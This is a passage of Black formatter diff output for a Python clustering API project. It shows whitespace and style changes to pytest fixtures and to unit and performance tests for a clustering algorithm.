             "email": user_data["email"],
             "role": user_data["role"],
-            "scopes": user_data["scopes"]
+            "scopes": user_data["scopes"],
         }
-        
+
         access_token = create_access_token(token_data)
         tokens[user_type] = {
             "access_token": access_token,
             "token_type": "bearer",
-            "user_data": user_data
+            "user_data": user_data,
         }
-    
+
     return tokens
+
 
 @pytest.fixture(scope="function")
 def auth_headers(test_tokens):
     """Provide authorization headers for different user types."""
     headers = {}
-    
+
     for user_type, token_info in test_tokens.items():
-        headers[user_type] = {
-            "Authorization": f"***'access_token']}"
-        }
-    
+        headers[user_type] = {"Authorization": f"***'access_token']}"}
+
     return headers
+
 
 @pytest.fixture(scope="function")
 def admin_headers(auth_headers):
     """Provide admin authorization headers."""
     return auth_headers["admin"]
 
+
 @pytest.fixture(scope="function")
 def user_headers(auth_headers):
     """Provide regular user authorization headers."""
     return auth_headers["user"]
 
+
 @pytest.fixture(scope="function")
 def readonly_headers(auth_headers):
     """Provide readonly user authorization headers."""
     return auth_headers["readonly"]
 
+
 # Test data fixtures
 @pytest.fixture(scope="function")
 def sample_data_points():
     """Provide sample data points for testing."""
     return SAMPLE_DATA_POINTS.copy()
 
+
 @pytest.fixture(scope="function")
 def large_data_batch():
     """Generate large batch of test data points."""
     import random
-    
+
     data_points = []
     for i in range(1000):
         # Generate clustered data
         if i < 300:  # Cluster 1
             base = [1.0, 2.0, 3.0]
         elif i < 600:  # Cluster 2
             base = [5.0, 6.0, 7.0]
         else:  # Cluster 3
             base = [10.0, 11.0, 12.0]
-        
+
         # Add noise
-        features = [
-            base[j] + random.uniform(-0.5, 0.5) 
-            for j in range(len(base))
-        ]
-        
-        data_points.append({
-            "id": f"test_point_{i}",
-            "features": features
-        })
-    
+        features = [base[j] + random.uniform(-0.5, 0.5) for j in range(len(base))]
+
+        data_points.append({"id": f"test_point_{i}", "features": features})
+
     return data_points
+
 
 @pytest.fixture(scope="function")
 def clustering_config():
     """Provide test clustering configuration."""
     return SAMPLE_CLUSTERING_CONFIG.copy()
 
+
 @pytest.fixture(scope="function")
 def session_id():
     """Generate unique session ID for tests."""
     return str(uuid.uuid4())
 
+
 # Mock external services
 @pytest.fixture(scope="function")
 def mock_redis():
     """Mock Redis connection for tests."""
     mock_redis = MagicMock()
-    
+
     # In-memory storage for testing
     storage = {}
-    
+
     def get(key):
         return storage.get(key)
-    
+
     def set(key, value, ex=None):
         storage[key] = value
         return True
-    
+
     def delete(key):
         return storage.pop(key, None) is not None
-    
+
     def exists(key):
         return key in storage
-    
+
     mock_redis.get = get
     mock_redis.set = set
     mock_redis.delete = delete
     mock_redis.exists = exists
-    
+
     return mock_redis
 
-@pytest.fixture(scope="function") 
+
+@pytest.fixture(scope="function")
 def mock_metrics_collector():
     """Mock metrics collector for tests."""
     mock = MagicMock()
-    
+
     # Configure mock methods
     mock.record_request_metrics.return_value = None
     mock.record_algorithm_metrics.return_value = None
     mock.record_database_metrics.return_value = None
     mock.record_error.return_value = None
-    
+
     return mock
+
 
 # Performance test fixtures
 @pytest.fixture(scope="session")
 def performance_test_config():
     """Provide performance test configuration."""
     return {
         "target_response_time_ms": 200,
         "target_throughput_per_sec": 1000,
         "stress_test_duration": 60,  # seconds
         "concurrent_users": [1, 5, 10, 20],
-        "batch_sizes": [100, 1000, 10000]
+        "batch_sizes": [100, 1000, 10000],
     }
+
 
 # Async fixtures
 @pytest_asyncio.fixture
 async def async_db_session(test_engine):
     """Provide async database session for async tests."""
     from sqlalchemy.ext.asyncio import AsyncSession, async_sessionmaker
-    
+
     # This is a simplified async session for testing
     # In practice, you'd use an async-compatible engine
     session = test_engine.connect()
     yield session
     session.close()
 
+
 # Utility fixtures
 @pytest.fixture(scope="function")
 def temp_file():
     """Provide temporary file for tests."""
-    with tempfile.NamedTemporaryFile(mode='w+', delete=False) as f:
+    with tempfile.NamedTemporaryFile(mode="w+", delete=False) as f:
         yield f.name
-    
+
     # Cleanup
     try:
         os.unlink(f.name)
     except FileNotFoundError:
         pass
 
+
 @pytest.fixture(scope="function")
 def temp_directory():
     """Provide temporary directory for tests."""
     with tempfile.TemporaryDirectory() as temp_dir:
         yield temp_dir
 
+
 @pytest.fixture(scope="function")
 def captured_logs():
     """Capture logs during tests."""
     import logging
     from io import StringIO
-    
+
     log_capture = StringIO()
     handler = logging.StreamHandler(log_capture)
-    
+
     # Add handler to root logger
     logging.getLogger().addHandler(handler)
-    
+
     yield log_capture
-    
+
     # Cleanup
     logging.getLogger().removeHandler(handler)
+
 
 # Environment fixtures
 @pytest.fixture(scope="session", autouse=True)
 def setup_test_environment():
     """Set up test environment variables."""
     original_env = os.environ.copy()
-    
+
     # Set test environment variables
-    os.environ.update({
-        "ENVIRONMENT": "testing",
-        "DATABASE_URL": TEST_DATABASE_URL,
-        "REDIS_URL": TEST_REDIS_URL,
-        "JWT_SECRET_KEY": "test_secret_key_for_testing_only",
-        "API_KEYS": "test_api_key_1,test_api_key_2",
-        "LOG_LEVEL": "DEBUG"
-    })
-    
+    os.environ.update(
+        {
+            "ENVIRONMENT": "testing",
+            "DATABASE_URL": TEST_DATABASE_URL,
+            "REDIS_URL": TEST_REDIS_URL,
+            "JWT_SECRET_KEY": "test_secret_key_for_testing_only",
+            "API_KEYS": "test_api_key_1,test_api_key_2",
+            "LOG_LEVEL": "DEBUG",
+        }
+    )
+
     yield
-    
+
     # Restore original environment
     os.environ.clear()
     os.environ.update(original_env)
+
 
 # Database seeding fixtures
 @pytest.fixture(scope="function")
 def seed_test_data(test_db_session, session_id):
     """Seed database with test data."""
     from database.models import ProcessingSession, ClusterRecord, DataPointRecord
     from datetime import datetime
-    
+
     # Create test session
     session = ProcessingSession(
         id=session_id,
         session_name="Test Session",
         user_id="test_user",
         algorithm_config=SAMPLE_CLUSTERING_CONFIG,
         algorithm_version="1.0.0",
         api_version="1.0.0",
-        status="active"
+        status="active",
     )
     test_db_session.add(session)
-    
+
     # Create test cluster
     cluster = ClusterRecord(
         session_id=session_id,
         cluster_label="Test Cluster 1",
         centroid=[1.0, 2.0, 3.0],
         dimensionality=3,
         radius=1.0,
-        min_points=2
+        min_points=2,
     )
     test_db_session.add(cluster)
     test_db_session.flush()
-    
+
     # Create test data points
     for i, point_data in enumerate(SAMPLE_DATA_POINTS):
         data_point = DataPointRecord(
             session_id=session_id,
             point_id=point_data["id"],
             features=point_data["features"],
             dimensionality=len(point_data["features"]),
             processing_order=i,
             algorithm_version="1.0.0",
             cluster_id=cluster.id if i < 2 else None,
-            is_outlier=i >= 4
+            is_outlier=i >= 4,
         )
         test_db_session.add(data_point)
-    
+
     test_db_session.commit()
-    
+
     yield {
         "session": session,
         "cluster": cluster,
-        "data_points": test_db_session.query(DataPointRecord).filter(
-            DataPointRecord.session_id == session_id
-        ).all()
+        "data_points": test_db_session.query(DataPointRecord)
+        .filter(DataPointRecord.session_id == session_id)
+        .all(),
     }
+
 
 # Error simulation fixtures
 @pytest.fixture(scope="function")
 def simulate_database_error():
     """Simulate database errors for testing error handling."""
+
     def _simulate_error():
         from sqlalchemy.exc import SQLAlchemyError
+
         raise SQLAlchemyError("Simulated database error")
-    
+
     return _simulate_error
+
 
 @pytest.fixture(scope="function")
 def simulate_algorithm_error():
     """Simulate algorithm errors for testing error handling."""
+
     def _simulate_error():
         raise RuntimeError("Simulated algorithm error")
-    
+
     return _simulate_error
+
 
 # Test event loop for async tests
 @pytest.fixture(scope="session")
 def event_loop():
     """Create event loop for async tests."""
     loop = asyncio.new_event_loop()
     yield loop
     loop.close()
 
+
 # Cleanup fixture
 @pytest.fixture(scope="function", autouse=True)
 def cleanup_after_test():
     """Cleanup after each test."""
     yield
-    
+
     # Clear any global state
     # Reset mocks
     # Clear caches
-    pass
\ No newline at end of file
+    pass
--- /home/runner/work/NCS-API-Project/NCS-API-Project/tests/test_algorithm.py	2025-06-10 20:31:25.484857+00:00
would reformat /home/runner/work/NCS-API-Project/NCS-API-Project/tests/test_algorithm.py
+++ /home/runner/work/NCS-API-Project/NCS-API-Project/tests/test_algorithm.py	2025-06-10 20:32:36.790943+00:00
@@ -18,678 +18,653 @@
 from unittest.mock import patch, MagicMock
 
 from NCS_V8 import NCSClusteringAlgorithm
 from . import SAMPLE_DATA_POINTS, SAMPLE_CLUSTERING_CONFIG
 
+
 class TestAlgorithmInitialization:
     """Test algorithm initialization and configuration."""
-    
+
     def test_default_initialization(self):
         """Test algorithm initialization with default parameters."""
         algorithm = NCSClusteringAlgorithm()
-        
+
         assert algorithm.similarity_threshold == 0.85
         assert algorithm.min_cluster_size == 3
         assert algorithm.max_clusters == 1000
         assert algorithm.outlier_threshold == 0.75
         assert algorithm.adaptive_threshold is True
-    
+
     def test_custom_initialization(self):
         """Test algorithm initialization with custom parameters."""
         config = {
             "similarity_threshold": 0.9,
             "min_cluster_size": 5,
             "max_clusters": 500,
             "outlier_threshold": 0.8,
-            "adaptive_threshold": False
+            "adaptive_threshold": False,
         }
-        
+
         algorithm = NCSClusteringAlgorithm(**config)
-        
+
         assert algorithm.similarity_threshold == 0.9
         assert algorithm.min_cluster_size == 5
         assert algorithm.max_clusters == 500
         assert algorithm.outlier_threshold == 0.8
         assert algorithm.adaptive_threshold is False
-    
+
     def test_invalid_parameters(self):
         """Test algorithm initialization with invalid parameters."""
         with pytest.raises((ValueError, TypeError)):
             NCSClusteringAlgorithm(similarity_threshold=-0.5)  # Negative threshold
-        
+
         with pytest.raises((ValueError, TypeError)):
             NCSClusteringAlgorithm(min_cluster_size=0)  # Zero cluster size
-        
+
         with pytest.raises((ValueError, TypeError)):
             NCSClusteringAlgorithm(max_clusters=-1)  # Negative max clusters
 
+
 class TestDataPointProcessing:
     """Test individual data point processing."""
-    
+
     def test_process_single_point_new_cluster(self, test_algorithm):
         """Test processing first data point (creates new cluster)."""
         point = {"id": "point_1", "features": [1.0, 2.0, 3.0]}
-        
+
         result = test_algorithm.process_point(
-            point_id=point["id"],
-            features=point["features"]
-        )
-        
+            point_id=point["id"], features=point["features"]
+        )
+
         assert "cluster_id" in result
         assert "is_outlier" in result
         assert "confidence" in result
         assert "processing_time_ms" in result
-        
+
         assert result["is_outlier"] is False  # First point shouldn't be outlier
         assert result["confidence"] > 0
         assert result["processing_time_ms"] > 0
-    
+
     def test_process_similar_points_same_cluster(self, test_algorithm):
         """Test that similar points are assigned to the same cluster."""
         # Process first point
         point1 = {"id": "point_1", "features": [1.0, 2.0, 3.0]}
         result1 = test_algorithm.process_point(
-            point_id=point1["id"],
-            features=point1["features"]
-        )
-        
+            point_id=point1["id"], features=point1["features"]
+        )
+
         # Process similar point
         point2 = {"id": "point_2", "features": [1.1, 2.1, 3.1]}
         result2 = test_algorithm.process_point(
-            point_id=point2["id"],
-            features=point2["features"]
-        )
-        
+            point_id=point2["id"], features=point2["features"]
+        )
+
         # Should be in same cluster
         assert result1["cluster_id"] == result2["cluster_id"]
         assert result2["is_outlier"] is False
         assert result2["confidence"] > 0.5  # High confidence for similar points
-    
+
     def test_process_dissimilar_points_different_clusters(self, test_algorithm):
         """Test that dissimilar points create different clusters."""
         # Process first point
         point1 = {"id": "point_1", "features": [1.0, 2.0, 3.0]}
         result1 = test_algorithm.process_point(
-            point_id=point1["id"],
-            features=point1["features"]
-        )
-        
+            point_id=point1["id"], features=point1["features"]
+        )
+
         # Process dissimilar point
         point2 = {"id": "point_2", "features": [10.0, 20.0, 30.0]}
         result2 = test_algorithm.process_point(
-            point_id=point2["id"],
-            features=point2["features"]
-        )
-        
+            point_id=point2["id"], features=point2["features"]
+        )
+
         # Should be in different clusters
         assert result1["cluster_id"] != result2["cluster_id"]
         assert result2["is_outlier"] is False  # Still forms valid cluster
-    
+
     def test_process_outlier_point(self, test_algorithm):
         """Test outlier detection."""
         # Create a small cluster first
         cluster_points = [
             {"id": "point_1", "features": [1.0, 2.0, 3.0]},
             {"id": "point_2", "features": [1.1, 2.1, 3.1]},
-            {"id": "point_3", "features": [1.2, 2.2, 3.2]}
+            {"id": "point_3", "features": [1.2, 2.2, 3.2]},
         ]
-        
+
         for point in cluster_points:
             test_algorithm.process_point(
-                point_id=point["id"],
-                features=point["features"]
-            )
-        
+                point_id=point["id"], features=point["features"]
+            )
+
         # Process outlier point
         outlier_point = {"id": "outlier", "features": [100.0, 200.0, 300.0]}
         result = test_algorithm.process_point(
-            point_id=outlier_point["id"],
-            features=outlier_point["features"]
-        )
-        
+            point_id=outlier_point["id"], features=outlier_point["features"]
+        )
+
         # Should be detected as outlier if far enough
         # (depending on outlier threshold and algorithm parameters)
         assert "is_outlier" in result
         assert "outlier_score" in result
-    
+
     def test_process_point_invalid_features(self, test_algorithm):
         """Test processing point with invalid features."""
         invalid_cases = [
             {"id": "test", "features": []},  # Empty features
             {"id": "test", "features": [1.0, "invalid"]},  # Non-numeric features
             {"id": "test", "features": None},  # None features
         ]
-        
+
         for case in invalid_cases:
             with pytest.raises((ValueError, TypeError)):
                 test_algorithm.process_point(
-                    point_id=case["id"],
-                    features=case["features"]
+                    point_id=case["id"], features=case["features"]
                 )
-    
+
     def test_process_point_duplicate_id(self, test_algorithm):
         """Test processing point with duplicate ID."""
         point = {"id": "duplicate_point", "features": [1.0, 2.0, 3.0]}
-        
+
         # Process first time
         result1 = test_algorithm.process_point(
-            point_id=point["id"],
-            features=point["features"]
-        )
-        
+            point_id=point["id"], features=point["features"]
+        )
+
         # Process again with same ID
         result2 = test_algorithm.process_point(
-            point_id=point["id"],
-            features=[1.5, 2.5, 3.5]  # Different features
-        )
-        
+            point_id=point["id"], features=[1.5, 2.5, 3.5]  # Different features
+        )
+
         # Should handle gracefully (update or reject)
         assert result2 is not None
 
+
 class TestBatchProcessing:
     """Test batch processing functionality."""
-    
+
     def test_process_batch_success(self, test_algorithm):
         """Test successful batch processing."""
         batch_results = []
-        
+
         for point in SAMPLE_DATA_POINTS:
             result = test_algorithm.process_point(
-                point_id=point["id"],
-                features=point["features"]
+                point_id=point["id"], features=point["features"]
             )
             batch_results.append(result)
-        
+
         assert len(batch_results) == len(SAMPLE_DATA_POINTS)
-        
+
         # All results should have required fields
         for result in batch_results:
             assert "cluster_id" in result
             assert "is_outlier" in result
             assert "confidence" in result
             assert "processing_time_ms" in result
-    
+
     def test_process_batch_performance(self, test_algorithm):
         """Test batch processing performance."""
         # Generate larger dataset
         large_batch = []
         for i in range(1000):
             features = [
                 1.0 + (i % 10) * 0.1,
-                2.0 + (i % 10) * 0.1, 
-                3.0 + (i % 10) * 0.1
+                2.0 + (i % 10) * 0.1,
+                3.0 + (i % 10) * 0.1,
             ]
             large_batch.append({"id": f"point_{i}", "features": features})
-        
+
         start_time = time.time()
-        
+
         for point in large_batch:
             test_algorithm.process_point(
-                point_id=point["id"],
-                features=point["features"]
-            )
-        
+                point_id=point["id"], features=point["features"]
+            )
+
         processing_time = time.time() - start_time
         throughput = len(large_batch) / processing_time
-        
+
         # Should achieve reasonable throughput (target: >1000 points/sec)
         assert throughput > 100  # Minimum acceptable throughput
-    
+
     def test_concurrent_processing(self, test_algorithm):
         """Test concurrent point processing."""
         import threading
-        
+
         results = []
         errors = []
-        
+
         def process_points(start_idx, count):
             try:
                 for i in range(start_idx, start_idx + count):
                     result = test_algorithm.process_point(
                         point_id=f"concurrent_point_{i}",
-                        features=[i * 0.1, i * 0.2, i * 0.3]
+                        features=[i * 0.1, i * 0.2, i * 0.3],
                     )
                     results.append(result)
             except Exception as e:
                 errors.append(e)
-        
+
         # Create multiple threads
         threads = []
         for i in range(5):
-            thread = threading.Thread(
-                target=process_points,
-                args=(i * 20, 20)
-            )
+            thread = threading.Thread(target=process_points, args=(i * 20, 20))
             threads.append(thread)
             thread.start()
-        
+
         # Wait for all threads
         for thread in threads:
             thread.join()
-        
+
         # Check results
         assert len(errors) == 0  # No errors should occur
         assert len(results) == 100  # All points processed
 
+
 class TestClusterManagement:
     """Test cluster creation, management, and evolution."""
-    
+
     def test_cluster_creation(self, test_algorithm):
         """Test automatic cluster creation."""
         initial_clusters = len(test_algorithm.get_clusters())
-        
+
         # Process points to create clusters
         test_algorithm.process_point("point_1", [1.0, 2.0, 3.0])
         test_algorithm.process_point("point_2", [10.0, 20.0, 30.0])
-        
+
         clusters = test_algorithm.get_clusters()
         assert len(clusters) > initial_clusters
-    
+
     def test_cluster_growth(self, test_algorithm):
         """Test cluster growth as similar points are added."""
         # Create initial cluster
         test_algorithm.process_point("point_1", [1.0, 2.0, 3.0])
-        
+
         clusters_before = test_algorithm.get_clusters()
         initial_cluster_id = None
         for cluster in clusters_before:
             if cluster["size"] > 0:
                 initial_cluster_id = cluster["id"]
                 initial_size = cluster["size"]
                 break
-        
+
         # Add similar points
         test_algorithm.process_point("point_2", [1.1, 2.1, 3.1])
         test_algorithm.process_point("point_3", [1.2, 2.2, 3.2])
-        
+
         clusters_after = test_algorithm.get_clusters()
-        
+
         # Find the same cluster and check growth
         for cluster in clusters_after:
             if cluster["id"] == initial_cluster_id:
                 assert cluster["size"] > initial_size
                 break
-    
+
     def test_cluster_merging(self, test_algorithm):
         """Test cluster merging when clusters become similar."""
         # This test depends on algorithm implementation details
         # Create two separate small clusters
         test_algorithm.process_point("point_1", [1.0, 2.0, 3.0])
         test_algorithm.process_point("point_2", [5.0, 6.0, 7.0])
-        
-        initial_cluster_count = len([c for c in test_algorithm.get_clusters() if c["size"] > 0])
-        
+
+        initial_cluster_count = len(
+            [c for c in test_algorithm.get_clusters() if c["size"] > 0]
+        )
+
         # Add points that bridge the clusters
         for i in range(10):
             features = [1.0 + i * 0.4, 2.0 + i * 0.4, 3.0 + i * 0.4]
             test_algorithm.process_point(f"bridge_point_{i}", features)
-        
-        final_cluster_count = len([c for c in test_algorithm.get_clusters() if c["size"] > 0])
-        
+
+        final_cluster_count = len(
+            [c for c in test_algorithm.get_clusters() if c["size"] > 0]
+        )
+
         # Clusters might merge (depends on algorithm implementation)
         assert final_cluster_count <= initial_cluster_count + 1
-    
+
     def test_cluster_health_monitoring(self, test_algorithm):
         """Test cluster health monitoring."""
         # Create cluster with several points
         for i in range(10):
             test_algorithm.process_point(
-                f"health_point_{i}",
-                [1.0 + i * 0.1, 2.0 + i * 0.1, 3.0 + i * 0.1]
-            )
-        
+                f"health_point_{i}", [1.0 + i * 0.1, 2.0 + i * 0.1, 3.0 + i * 0.1]
+            )
+
         clusters = test_algorithm.get_clusters()
-        
+
         for cluster in clusters:
             if cluster["size"] > 0:
                 assert "health" in cluster
                 assert cluster["health"] in ["healthy", "degraded", "unhealthy"]
-                
+
                 # Healthy clusters should have reasonable properties
                 if cluster["health"] == "healthy":
                     assert cluster["size"] >= test_algorithm.min_cluster_size
                     assert "centroid" in cluster
                     assert len(cluster["centroid"]) > 0
 
+
 class TestOutlierDetection:
     """Test outlier detection functionality."""
-    
+
     def test_outlier_detection_threshold(self, test_algorithm):
         """Test outlier detection based on threshold."""
         # Create a tight cluster
         cluster_points = [
             [1.0, 2.0, 3.0],
             [1.1, 2.1, 3.1],
             [1.2, 2.2, 3.2],
-            [1.3, 2.3, 3.3]
+            [1.3, 2.3, 3.3],
         ]
-        
+
         for i, features in enumerate(cluster_points):
             test_algorithm.process_point(f"cluster_point_{i}", features)
-        
+
         # Process clear outlier
         outlier_result = test_algorithm.process_point(
-            "outlier_point",
-            [100.0, 200.0, 300.0]
-        )
-        
+            "outlier_point", [100.0, 200.0, 300.0]
+        )
+
         # Check outlier detection
         assert "is_outlier" in outlier_result
         assert "outlier_score" in outlier_result
-        
+
         if outlier_result["is_outlier"]:
             assert outlier_result["outlier_score"] > test_algorithm.outlier_threshold
-    
+
     def test_adaptive_outlier_threshold(self):
         """Test adaptive outlier threshold adjustment."""
         algorithm = NCSClusteringAlgorithm(adaptive_threshold=True)
-        
+
         # Process several normal points
-        normal_points = [
-            [1.0, 2.0, 3.0],
-            [1.5, 2.5, 3.5],
-            [2.0, 3.0, 4.0]
-        ]
-        
+        normal_points = [[1.0, 2.0, 3.0], [1.5, 2.5, 3.5], [2.0, 3.0, 4.0]]
+
         for i, features in enumerate(normal_points):
             algorithm.process_point(f"normal_{i}", features)
-        
+
         # Get initial threshold
         initial_threshold = algorithm.outlier_threshold
-        
+
         # Process some outliers
-        outlier_points = [
-            [50.0, 60.0, 70.0],
-            [100.0, 110.0, 120.0]
-        ]
-        
+        outlier_points = [[50.0, 60.0, 70.0], [100.0, 110.0, 120.0]]
+
         for i, features in enumerate(outlier_points):
             algorithm.process_point(f"outlier_{i}", features)
-        
+
         # Threshold might adapt
         final_threshold = algorithm.outlier_threshold
-        
+
         # With adaptive threshold, it might change
         # (depends on algorithm implementation)
         assert isinstance(final_threshold, (int, float))
-    
+
     def test_outlier_statistics(self, test_algorithm):
         """Test outlier statistics tracking."""
         # Process mix of normal points and outliers
         points = [
             {"features": [1.0, 2.0, 3.0], "expected_outlier": False},
             {"features": [1.1, 2.1, 3.1], "expected_outlier": False},
             {"features": [100.0, 200.0, 300.0], "expected_outlier": True},
-            {"features": [1.2, 2.2, 3.2], "expected_outlier": False}
+            {"features": [1.2, 2.2, 3.2], "expected_outlier": False},
         ]
-        
+
         for i, point in enumerate(points):
             test_algorithm.process_point(f"test_point_{i}", point["features"])
-        
+
         stats = test_algorithm.get_statistics()
-        
+
         assert "outliers_detected" in stats
         assert "outlier_percentage" in stats
         assert stats["outliers_detected"] >= 0
         assert 0 <= stats["outlier_percentage"] <= 100
 
+
 class TestPerformanceMetrics:
     """Test performance monitoring and metrics."""
-    
+
     def test_processing_time_tracking(self, test_algorithm):
         """Test processing time measurement."""
         result = test_algorithm.process_point("timing_test", [1.0, 2.0, 3.0])
-        
+
         assert "processing_time_ms" in result
         assert result["processing_time_ms"] > 0
         assert result["processing_time_ms"] < 1000  # Should be fast
-    
+
     def test_throughput_measurement(self, test_algorithm):
         """Test throughput measurement."""
         start_time = time.time()
-        
+
         # Process batch of points
         for i in range(100):
             test_algorithm.process_point(
-                f"throughput_point_{i}",
-                [i * 0.1, i * 0.2, i * 0.3]
-            )
-        
+                f"throughput_point_{i}", [i * 0.1, i * 0.2, i * 0.3]
+            )
+
         end_time = time.time()
         duration = end_time - start_time
         throughput = 100 / duration
-        
+
         stats = test_algorithm.get_statistics()
-        
+
         # Check throughput tracking
         if "throughput_points_per_sec" in stats:
             assert stats["throughput_points_per_sec"] > 0
-    
+
     def test_memory_usage_tracking(self, test_algorithm):
         """Test memory usage monitoring."""
         # Process many points to increase memory usage
         for i in range(1000):
             test_algorithm.process_point(
-                f"memory_test_{i}",
-                [i * 0.01, i * 0.02, i * 0.03]
-            )
-        
+                f"memory_test_{i}", [i * 0.01, i * 0.02, i * 0.03]
+            )
+
         memory_usage = test_algorithm.get_memory_usage()
-        
+
         assert isinstance(memory_usage, (int, float))
         assert memory_usage > 0
-    
+
     def test_statistics_comprehensive(self, test_algorithm):
         """Test comprehensive statistics collection."""
         # Process varied data
         for i in range(50):
-            features = [
-                1.0 + (i % 5) * 2.0,
-                2.0 + (i % 5) * 2.0,
-                3.0 + (i % 5) * 2.0
-            ]
+            features = [1.0 + (i % 5) * 2.0, 2.0 + (i % 5) * 2.0, 3.0 + (i % 5) * 2.0]
             test_algorithm.process_point(f"stats_point_{i}", features)
-        
+
         stats = test_algorithm.get_statistics()
-        
+
         # Check required statistics
         required_stats = [
             "total_points_processed",
             "active_clusters",
             "total_clusters_created",
             "outliers_detected",
             "avg_processing_time_ms",
-            "memory_usage_mb"
+            "memory_usage_mb",
         ]
-        
+
         for stat in required_stats:
             assert stat in stats
             assert isinstance(stats[stat], (int, float))
 
+
 class TestMemoryManagement:
     """Test memory management and optimization."""
-    
+
     def test_bounded_memory_usage(self, test_algorithm):
         """Test that memory usage remains bounded."""
         initial_memory = test_algorithm.get_memory_usage()
-        
+
         # Process large number of points
         for i in range(5000):
             test_algorithm.process_point(
-                f"memory_point_{i}",
-                [i * 0.001, i * 0.002, i * 0.003]
-            )
-        
+                f"memory_point_{i}", [i * 0.001, i * 0.002, i * 0.003]
+            )
+
         final_memory = test_algorithm.get_memory_usage()
         memory_growth = final_memory - initial_memory
-        
+
         # Memory growth should be reasonable (not unbounded)
         assert memory_growth < 500  # Less than 500MB growth
-    
+
     def test_cluster_cleanup(self, test_algorithm):
         """Test cleanup of inactive clusters."""
         # Create many small clusters
         for i in range(100):
             # Spread out points to create separate clusters
             test_algorithm.process_point(
-                f"cleanup_point_{i}",
-                [i * 10.0, i * 10.0, i * 10.0]
-            )
-        
+                f"cleanup_point_{i}", [i * 10.0, i * 10.0, i * 10.0]
+            )
+
         initial_cluster_count = len(test_algorithm.get_clusters())
-        
+
         # Algorithm should eventually clean up small/inactive clusters
         # (depending on implementation)
         assert initial_cluster_count > 0
-    
+
     def test_data_point_cleanup(self, test_algorithm):
         """Test cleanup of old data points."""
         # Process many points
         for i in range(1000):
-            test_algorithm.process_point(
-                f"old_point_{i}",
-                [1.0, 2.0, 3.0]
-            )
-        
+            test_algorithm.process_point(f"old_point_{i}", [1.0, 2.0, 3.0])
+
         stats_before = test_algorithm.get_statistics()
-        
+
         # Force cleanup if implemented
-        if hasattr(test_algorithm, 'cleanup_old_data'):
+        if hasattr(test_algorithm, "cleanup_old_data"):
             test_algorithm.cleanup_old_data()
-            
+
             stats_after = test_algorithm.get_statistics()
-            
+
             # Memory usage might decrease after cleanup
             memory_before = stats_before.get("memory_usage_mb", 0)
             memory_after = stats_after.get("memory_usage_mb", 0)
-            
+
             assert memory_after <= memory_before
+
 
 class TestEdgeCases:
     """Test edge cases and error conditions."""
-    
+
     def test_empty_dataset(self, test_algorithm):
         """Test algorithm behavior with no data."""
         stats = test_algorithm.get_statistics()
-        
+
         assert stats["total_points_processed"] == 0
         assert stats["active_clusters"] == 0
         assert len(test_algorithm.get_clusters()) == 0
-    
+
     def test_single_point_dataset(self, test_algorithm):
         """Test algorithm with only one data point."""
         test_algorithm.process_point("single_point", [1.0, 2.0, 3.0])
-        
+
         stats = test_algorithm.get_statistics()
         clusters = test_algorithm.get_clusters()
-        
+
         assert stats["total_points_processed"] == 1
         assert len(clusters) >= 1
-    
+
     def test_identical_points(self, test_algorithm):
         """Test processing multiple identical points."""
         identical_features = [1.0, 2.0, 3.0]
-        
+
         results = []
         for i in range(10):
             result = test_algorithm.process_point(
-                f"identical_{i}",
-                identical_features.copy()
+                f"identical_{i}", identical_features.copy()
             )
             results.append(result)
-        
+
         # All should be in same cluster
         cluster_ids = [r["cluster_id"] for r in results]
         assert len(set(cluster_ids)) == 1  # Only one unique cluster ID
-    
+
     def test_high_dimensional_data(self, test_algorithm):
         """Test algorithm with high-dimensional data."""
         high_dim_features = [i * 0.1 for i in range(100)]  # 100 dimensions
-        
+
         result = test_algorithm.process_point("high_dim", high_dim_features)
-        
+
         assert "cluster_id" in result
         assert "confidence" in result
-    
+
     def test_extreme_values(self, test_algorithm):
         """Test algorithm with extreme numerical values."""
         extreme_cases = [
             [1e-10, 1e-10, 1e-10],  # Very small values
-            [1e10, 1e10, 1e10],     # Very large values
-            [0.0, 0.0, 0.0],        # Zero values
-            [-1e5, -1e5, -1e5]      # Large negative values
+            [1e10, 1e10, 1e10],  # Very large values
+            [0.0, 0.0, 0.0],  # Zero values
+            [-1e5, -1e5, -1e5],  # Large negative values
         ]
-        
+
         for i, features in enumerate(extreme_cases):
             result = test_algorithm.process_point(f"extreme_{i}", features)
-            
+
             assert result is not None
             assert "cluster_id" in result
-    
+
     def test_nan_and_infinite_values(self, test_algorithm):
         """Test algorithm handling of NaN and infinite values."""
         invalid_cases = [
-            [float('nan'), 1.0, 2.0],     # NaN values
-            [float('inf'), 1.0, 2.0],     # Infinite values
-            [1.0, float('-inf'), 2.0]     # Negative infinite
+            [float("nan"), 1.0, 2.0],  # NaN values
+            [float("inf"), 1.0, 2.0],  # Infinite values
+            [1.0, float("-inf"), 2.0],  # Negative infinite
         ]
-        
+
         for i, features in enumerate(invalid_cases):
             with pytest.raises((ValueError, TypeError)):
                 test_algorithm.process_point(f"invalid_{i}", features)
 
+
 @pytest.mark.performance
 class TestAlgorithmPerformance:
     """Test algorithm performance requirements."""
-    
+
     def test_target_throughput(self, test_algorithm):
         """Test algorithm meets target throughput."""
         start_time = time.time()
-        
+
         # Process 1000 points
         for i in range(1000):
             test_algorithm.process_point(
-                f"perf_point_{i}",
-                [i % 10, (i % 10) + 1, (i % 10) + 2]
-            )
-        
+                f"perf_point_{i}", [i % 10, (i % 10) + 1, (i % 10) + 2]
+            )
+
         end_time = time.time()
         duration = end_time - start_time
         throughput = 1000 / duration
-        
+
         # Should achieve target throughput (>1000 points/sec)
         assert throughput > 1000
-    
+
     def test_memory_efficiency(self, test_algorithm):
         """Test memory efficiency with large datasets."""
         initial_memory = test_algorithm.get_memory_usage()
-        
+
         # Process 10,000 points
         for i in range(10000):
             test_algorithm.process_point(
-                f"memory_perf_{i}",
-                [i % 100, (i % 100) + 1, (i % 100) + 2]
-            )
-        
+                f"memory_perf_{i}", [i % 100, (i % 100) + 1, (i % 100) + 2]
+            )
+
         final_memory = test_algorithm.get_memory_usage()
         memory_per_point = (final_memory - initial_memory) / 10000
-        
+
         # Should use reasonable memory per point (<1KB per point)
         assert memory_per_point < 1.0  # Less than 1MB per 1000 points
-    
+
     def test_processing_time_consistency(self, test_algorithm):
         """Test consistent processing times."""
         processing_times = []
-        
+
         for i in range(100):
             start_time = time.time()
-            test_algorithm.process_point(f"timing_{i}", [i, i+1, i+2])
+            test_algorithm.process_point(f"timing_{i}", [i, i + 1, i + 2])
             processing_time = (time.time() - start_time) * 1000  # Convert to ms
             processing_times.append(processing_time)
-        
+
         # Calculate statistics
         avg_time = sum(processing_times) / len(processing_times)
         max_time = max(processing_times)
-        
+
         # Processing should be consistent
         assert avg_time < 10  # Average under 10ms
